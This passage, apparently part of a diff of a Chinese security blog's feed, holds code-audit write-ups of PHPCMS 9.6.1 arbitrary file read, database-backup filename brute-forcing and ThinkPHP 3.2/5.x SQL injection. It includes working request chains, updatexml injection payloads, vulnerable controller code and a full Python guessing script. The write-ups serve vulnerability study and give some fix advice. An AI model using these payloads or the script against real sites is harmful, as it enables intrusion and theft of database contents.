+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;&amp;id&#x3D;###payload###&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;</span><br><span class="line"></span><br><span class="line">userid_flash&#x3D;Set-Cookie</span><br></pre></td></tr></table></figure>
+
+<p>我们找到<code>attachment</code>模块下的<code>attachments</code>文件中的<code>swfupload_json</code>函数</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gshzzk7j73j30vw0bjjxp.jpg" alt="image-20210715175112616"></p>
+<p>到<code>src</code>时有一个<code>safe_replace</code>函数我们跟进</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzzqgxsgj313b0h3gxn.jpg" alt="image-20210715183735791"></p>
+<p>发现一个waf所以我们的src为什么要写成%*27的原因，就是为了绕过一次waf</p>
+<p>继续到<code>set_cookie</code>我们跟进去发现<code>set_cookie</code>调用了<code>sys_auth</code>这个函数并且进行了<code>ENCODE</code>刚好我们又可以再前台看见</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzzvvhocj316r09xdnt.jpg" alt="image-20210715175343564"></p>
+<p>至于我们为什么要传入一个POST值，是在<code>__construct</code>中如果没有这个<code>userid</code>他会<code>showmessage</code></p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi0020owtj3177063wjx.jpg" alt="image-20210715180755944"></p>
+<p>而<code>userid</code>是17行的关键代码。我们肯定没有<code>userid</code>嘛所以三元表达式到第三个，他进行解密一次并且<code>userid=1</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;userid &#x3D; $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</span><br></pre></td></tr></table></figure>
+
+<p>现在POST值是怎么拿到的呢，回到第一步，访问的URL</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>我们周到<code>wap</code>下的<code>index</code>下的<code>siteid</code> 而<code>siteid</code>直接就在<code>__construct</code>函数里面，于是经过一次<code>set_cookie</code>加密</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi007ce39j30zf08gtfc.jpg" alt="image-20210715185530441"></p>
+<p>我们现在来顺利一下整个过程</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi00c9wrvj30vk0ihh2a.jpg" alt="image-20210715193138877"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>把$a_k过滤一次,把$id用<code>intval</code>过滤一次</p>
+<h1 id="PHPCMS9-6-1任意文件读取"><a href="#PHPCMS9-6-1任意文件读取" class="headerlink" title="PHPCMS9.6.1任意文件读取"></a>PHPCMS9.6.1任意文件读取</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>步骤同上一个漏洞所以就不截图了</p>
+<p>第一步访问把得到的set-cookie 记录下来</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;siteid&#x3D;1 </span><br></pre></td></tr></table></figure>
+
+<p>第二步访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D.&#x2F;phpcms&#x2F;base%26f%3D.p%25253chp</span><br></pre></td></tr></table></figure>
+
+<p>同样POST传递值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userid_flash&#x3D;第一步获取的Set-cookie</span><br></pre></td></tr></table></figure>
+
+<p>第三部访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;第二步获取的set-cookie</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi00ihqhnj30ww0dzq6g.jpg" alt="image-20210715201247818"></p>
+<p>就可以下载我们要下载的文件</p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们还是和<code>wap_SQL注入</code>那样逆向分析一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;set-cookie</span><br></pre></td></tr></table></figure>
+
+<p>经过解密之后</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsi00nmiqfj316p06jdmj.jpg" alt="image-20210715205338895"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;pad&#x3D;x&amp;i&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;d&#x3D;1&amp;m&#x3D;1&amp;s&#x3D;.\&#x2F;phpcms\&#x2F;base&amp;f&#x3D;.p%253chp&quot;,&quot;filename&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过<code>safe_replace</code>处理之后</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;quotaid&amp;quot:1,&amp;quotsrc&amp;quot:&amp;quotpad&#x3D;x&amp;i&#x3D;1&amp;modelid&#x3D;1&amp;catid&#x3D;1&amp;d&#x3D;1&amp;m&#x3D;1&amp;s&#x3D;.&#x2F;phpcms&#x2F;base&amp;f&#x3D;.p%253chp&amp;quot,&amp;quotfilename&amp;quot:&amp;quot&amp;quot</span><br></pre></td></tr></table></figure>
+
+<p>但是我们关键的是&amp;s和&amp;f没有任何变化</p>
+<p>再经过<code>parse_str</code>处理我们的url会被解码一次</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsi00rwoy1j311h03y0v5.jpg" alt="image-20210715205642241"></p>
+<p><code>$f现在就是.p%3cphp</code></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsi00w5ajdj315f0fg4d1.jpg" alt="image-20210715210151809"></p>
+<p>然后<code>downurl</code>发生变化我们点击下载到download函数</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsi010iwqlj611y0i4du502.jpg" alt="image-20210715210928651"></p>
+<p>经过一次解密再经过<code>parse_str</code>转码<code>%3c=&gt; &lt;</code></p>
+<p>走到118行因为传递的m=1经过<code>$fileurl</code>把他拼接起来变成</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\phpcms\base.p&lt;hp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($m) $fileurl &#x3D; trim($s).trim($fileurl);  &#x2F;&#x2F;118行代码</span><br></pre></td></tr></table></figure>
+
+<p>然后走到125行进行随机名称生成，126行他又把<code>$fileurl</code>的&lt;给去掉了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$filename &#x3D; date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;      &#x2F;&#x2F;125</span><br><span class="line">$fileurl &#x3D; str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl);    &#x2F;&#x2F;126</span><br></pre></td></tr></table></figure>
+
+<p>然后就进行一个原始下载。</p>
+<p>第二部分和第一部分参考上面<code>wap_sql</code>注入,原理一样。我们现在梳理一下这个漏洞。</p>
+<p>从最下面分析，他过滤了&lt;&gt; 然后到上面php等一些黑名单 那就P&lt;HP就可以</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsi0155bxjj313q0gczvh.jpg" alt="image-20210715212632058"></p>
+<p><code>$fileurl</code>是通过<code>$s</code>来的和<code>$f</code>来的。而<code>$f和$s</code>是通过构造<code>$a_k</code>来的，其中就<code>DECODE</code> 了两次</p>
+<p>所以要通过<code>siteid=1</code>来进行<code>ENCODE</code>一次。我们为什么要传一个<code>userid_flash</code></p>
+<p>因为<code>attachments</code>下的析构函数中的<code>userid</code>不能为空<br>而我们没登陆所以需要<code>sys_auth($_POST[&#39;userid_flash&#39;],DECODE&#39;)</code>解密一下传入的<code>userid_flash</code>使得<code>userid=1</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;userid &#x3D; $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] :(param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) :sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));</span><br></pre></td></tr></table></figure>
+
+<p>又经过<code>set_cookie(&#39;att_json&#39;,$json_str)</code>;然后又返回到前台<code>set-cookie</code></p>
+<p>最终通过以下方法进行了下载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?m&#x3D;content&amp;c&#x3D;down&amp;a&#x3D;init&amp;a_k&#x3D;set-cookie</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote>
+<p>官方V9.6.2是先过滤&lt;&gt;再进行php等黑名单过滤，我们还是可以继续通过空白字符来进行绕过的<br>%81-%99间的字符是不会被trim去掉的且在windows中还能正常访问到相应的文件。并且得到auth_key之后还可以进行其他的操作例如SQL注入等</p>
+</blockquote>
+<h1 id="PHPCMSV9暴力猜解数据库"><a href="#PHPCMSV9暴力猜解数据库" class="headerlink" title="PHPCMSV9暴力猜解数据库"></a>PHPCMSV9暴力猜解数据库</h1><blockquote>
+<p>备份路径 \caches\bakup\default\xxxx.sql</p>
+</blockquote>
+<p>而问题出现在哪，我们先看POC。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc:</span><br><span class="line">&#x2F;api.php?op&#x3D;creatimg&amp;txt&#x3D;1&amp;font&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;caches&#x2F;bakup&#x2F;default&#x2F;s&lt;&lt;.sql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsi019u7foj30so0bsn67.jpg" alt="image-20210715221054129"></p>
+<p>原因：</p>
+<blockquote>
+<p>windows的FindFirstFile（API)有个特性就是可以把&lt;&lt;当成通配符来用而PHP的opendir(win32readdir.c)就使用了该API。PHP的文件操作函数均调用了opendir,所以file_exists也有此特性。<br>pwaaov0zodprrm5371pe_db_20210715_1.sql<br>file_exists — opendir  – FindFirstFile – &lt;&lt;  通配符<br>file_exists  - &lt;&lt;  通配符<br>333xxxx.sql<br>3&lt;&lt;.sql<br>file_exists(3&lt;&lt;.sql)</p>
+</blockquote>
+<p>因为返回的只不同所以我们可以逐个猜解</p>
+<p>附上斗鱼Sec脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author: dysec</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    mark = <span class="literal">True</span></span><br><span class="line">    req = urllib2.Request(url)</span><br><span class="line">    req.add_header(<span class="string">&#x27;User-agent&#x27;</span>, <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    content = response.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Cannot&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">        mark = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> mark</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest</span>(<span class="params">target</span>):</span></span><br><span class="line">    arr = []</span><br><span class="line">    num = <span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">58</span>))</span><br><span class="line">    alpha = <span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>))</span><br><span class="line">    exploit = <span class="string">&#x27;%s/api.php?op=creatimg&amp;txt=dysec&amp;font=/../../../../caches/bakup/default/%s%s&lt;&lt;.sql&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> check(exploit % (target, <span class="string">&#x27;&#x27;</span>.join(arr), char)):</span><br><span class="line">                arr.append(char)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt; <span class="number">20</span>:</span><br><span class="line">                <span class="keyword">for</span> char <span class="keyword">in</span> alpha:</span><br><span class="line">                    <span class="keyword">if</span> check(exploit % (target, <span class="string">&#x27;&#x27;</span>.join(arr), char)):</span><br><span class="line">                        arr.append(char)</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(arr) == <span class="number">20</span>:</span><br><span class="line">                arr.append(<span class="string">&#x27;_db_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(arr) == <span class="number">29</span>:</span><br><span class="line">                arr.append(<span class="string">&#x27;_1.sql&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(arr) &lt; <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;[*]not find!&#x27;</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[*]find: %s/caches/bakup/default/%s&#x27;</span> % (target, <span class="string">&#x27;&#x27;</span>.join(arr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        url = <span class="string">&#x27;http://www.x.com&#x27;</span></span><br><span class="line">        <span class="comment">#test</span></span><br><span class="line">        guest(url)</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>杂七杂八</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
-    <title>ThinkPHP3.2注入漏洞学习</title>
-    <url>/2021/07/29/ThinkPHP3-2%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<center>ThinkPHP3.2注入漏洞学习</center>
+    <title>ThinkPHP5.x注入漏洞学习</title>
+    <url>/2021/08/03/ThinkPHP5-x%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<center>ThinkPHP5.x注入漏洞学习</center>
 
-<h1 id="Exp注入"><a href="#Exp注入" class="headerlink" title="Exp注入"></a>Exp注入</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们可以看到漏洞代码并没有使用<code>I函数</code>（<strong>使用<code>I函数</code>则不会产生exp注入</strong>）原因后面会分析</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        $username=I(username);</span></span><br><span class="line">        <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];  <span class="comment">//注意这里是GET接受的参数</span></span><br><span class="line">        <span class="variable">$data</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>])-&gt;select();</span><br><span class="line"></span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>以下复现均需要在<strong>application/database.php</strong> 文件中配置数据库相关信息，并开启 **application/config 中的 ** <strong>app_debug</strong> 和 <strong>app_trace</strong> </p>
+</blockquote>
+<p>通过以下命令获取测试环境代码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=版本 tpdemo</span><br></pre></td></tr></table></figure>
 
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username[0]&#x3D;exp&amp;username[1]&#x3D;&#x3D;&#39;admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>
+<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下，之后执行一次 <code>composer update</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;漏洞版本&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsxo4uwmygj31cr0hm4ak.jpg" alt="image-20210728135419160"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们先来了解一下where中的exp</p>
+<h1 id="ThinkPHP-ParseData-方法注入"><a href="#ThinkPHP-ParseData-方法注入" class="headerlink" title="ThinkPHP ParseData 方法注入"></a>ThinkPHP ParseData 方法注入</h1><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Builder 类的 parseData 方法中</strong>。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生（<strong>insert</strong> 和<strong>update</strong>）注入，本文以insert注入为例。</p>
+<p>洞影响版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> 。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$level</span>=input(<span class="string">&quot;level/a&quot;</span>);</span><br><span class="line"><span class="comment">//        $data=db(&quot;users&quot;)-&gt;where(&quot;id&quot;,&quot;1&quot;)-&gt;insert([&quot;level&quot;=&gt;$level]);</span></span><br><span class="line">        <span class="variable">$data</span>=db(<span class="string">&quot;users&quot;</span>)-&gt;where(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;1&quot;</span>)-&gt;update([<span class="string">&quot;level&quot;</span>=&gt;<span class="variable">$level</span>]);</span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index/index?level[0]=inc&amp;level[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;level[2]=1</code></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3g80sxwij310d0h17dv.jpg" alt="image-20210731201318806"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接跟进到<code>insert</code></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fseyvdmj31650nj7l8.jpg" alt="image-20210731204914843"></p>
+<p>继续跟进<code>$this-&gt;builder-&gt;insert</code></p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt3fslm26aj315t0geti5.jpg" alt="image-20210731205528040"></p>
+<p>继续跟进<code>$this-&gt;parseData</code></p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fsrfeecj31780jzk5i.jpg" alt="image-20210731210557849"></p>
+<p>因为我们是数组所以进入这里，然后没有任何的过滤导致直接赋值给<code>$result[$item]</code></p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fsx00djj30zv08vaf2.jpg" alt="image-20210731210959068"></p>
+<p>然后我们这三种case都可以造成sql注入</p>
+<p>但是熟悉tp3的师傅们都熟悉。<code>I函数</code>接受的时候会有<code>htmlspecialchars </code>和 <code>think_filter</code> 的过滤处理</p>
+<p>tp5一样也是有的<code>filterExp</code>，会将我们<code>EXP</code>=&gt;<code>EXP空格</code> 因此就匹配不上了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3ft2myroj31dn065n04.jpg" alt="image-20210731211702335"></p>
+<p>回到<code>library/db/Buider.php</code>中然后返回的sql语句结果为，从而造成SQL注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;users&#96; (&#96;level&#96;) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </span><br></pre></td></tr></table></figure>
+
+<p>最后来一张攻击总结流程【图来自七月火前辈】</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3ftiag7jj31040xr17v.jpg" alt="9"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3ftr0gfkj31f80l5tif.jpg" alt="20210305100924794"></p>
+<h1 id="ThinkPHP-ParseArrayData-方法注入"><a href="#ThinkPHP-ParseArrayData-方法注入" class="headerlink" title="ThinkPHP ParseArrayData 方法注入"></a>ThinkPHP ParseArrayData 方法注入</h1><h2 id="漏洞概要-1"><a href="#漏洞概要-1" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql 类的 parseArrayData 方法</strong>中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生（ <strong>update</strong> 方法注入）</p>
+<p>影响版本：<strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7 (非最新的 5.1.8 版本也可利用)</strong></p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$level</span>=input(<span class="string">&quot;level/a&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span>=db(<span class="string">&quot;users&quot;</span>)-&gt;where(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;1&quot;</span>)-&gt;update([<span class="string">&quot;level&quot;</span>=&gt;<span class="variable">$level</span>]);</span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index/index?level[0]=point&amp;level[1]=1&amp;level[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;level[3]=0</code></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fu1n5vxj31f20jktln.jpg" alt="image-20210801131502459"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接到<code>library/think/db/</code><strong>Query</strong>类的<strong>update</strong>方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fu6t5qfj310m06j78g.jpg" alt="image-20210801144104009"></p>
+<p>我们继续跟进<strong>Connection</strong> 类的 <strong>update</strong> 方法，该方法又调用了 <strong>$this-&gt;builder</strong> 的 <strong>update</strong> 方法。</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fubq688j314z0c9jxj.jpg" alt="image-20210801143035326"></p>
+<p>我们直接跟进吧</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fug5lyfj317t0m2qfj.jpg" alt="image-20210801144534583"></p>
+<p>我们又看到<code>parseData</code>方法。5.0.19的SQL注入就是在这里产生的。我们跟进去看一下</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fukvrsbj313h0ein5e.jpg" alt="image-20210801145109994"></p>
+<p><strong>parseArrayData</strong>方法代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query <span class="variable">$query</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">list</span>(<span class="variable">$type</span>, <span class="variable">$value</span>) = <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//$data是我们传入的数组</span></span><br><span class="line">      <span class="keyword">switch</span> (strtolower(<span class="variable">$type</span>)) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">              <span class="variable">$fun</span>   = <span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="number">2</span>]) ? <span class="variable">$data</span>[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">              <span class="variable">$point</span> = <span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="number">3</span>]) ? <span class="variable">$data</span>[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">              <span class="keyword">if</span> (is_array(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                  <span class="variable">$value</span> = implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="variable">$result</span> = <span class="variable">$fun</span> . <span class="string">&#x27;(\&#x27;&#x27;</span> . <span class="variable">$point</span> . <span class="string">&#x27;(&#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">              <span class="variable">$result</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有任何的过滤将我们的恶意代码拼接了起来,所以可以构造出很多的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$result &#x3D; $fun . &#39;(\&#39;&#39; . $point . &#39;(&#39; . $value . &#39;)\&#39;)&#39;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$data</span>[<span class="number">2</span>] . <span class="string">&#x27;(\&#x27;&#x27;</span>. <span class="variable">$data</span>[<span class="number">3</span>].<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data</span>[<span class="number">1</span>].<span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>经过str_replace()于是我们的SQL语句就是</p>
